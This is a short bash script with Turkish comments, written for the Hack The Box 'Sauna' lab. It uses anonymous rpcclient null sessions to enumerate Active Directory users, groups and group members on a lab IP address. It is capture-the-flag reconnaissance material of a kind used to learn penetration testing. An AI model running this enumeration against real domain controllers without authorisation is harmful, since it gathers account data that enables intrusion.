#!/bin/bash

# HTB Sauna için RPC üzerinden AD kullanıcı ve grup bilgisi toplama scripti
# Geliştirici: Adem Süslü

# IP adresini buraya girin
TARGET_IP="10.129.80.101"

echo "[*] Kullanıcıları enumerate etmeye çalışılıyor (anonim)..."

# Kullanıcı listeleme (anonim)
rpcclient -U "" -N $TARGET_IP -c "enumdomusers"

echo
echo "[*] Grupları enumerate etmeye çalışılıyor (anonim)..."

# Grup listeleme
rpcclient -U "" -N $TARGET_IP -c "enumdomgroups"

echo
echo "[*] Her bir grup hakkında detaylı bilgi çekilebilir (örnek olarak grup RID: 0x200)..."

# Grup hakkında bilgi çekme örneği
rpcclient -U "" -N $TARGET_IP -c "querygroup 0x200"

echo
echo "[*] Grup üyelerini çekme örneği..."

# Grup üyeleri listeleme örneği
rpcclient -U "" -N $TARGET_IP -c "querygroupmem 0x200"

# Açıklama:
# -U ""     → Kullanıcı adı boş (anonim erişim)
# -N        → Şifre isteme (No password)
# -c        → Komut çalıştır
# 0x200     → RID (Relative Identifier), enumdomgroups çıktısından alınabilir

echo
echo "[+] İşlem tamamlandı. RID'leri belirledikten sonra 'querygroup' ve 'querygroupmem' komutlarını tekrarlayarak bilgi toplayabilirsiniz."

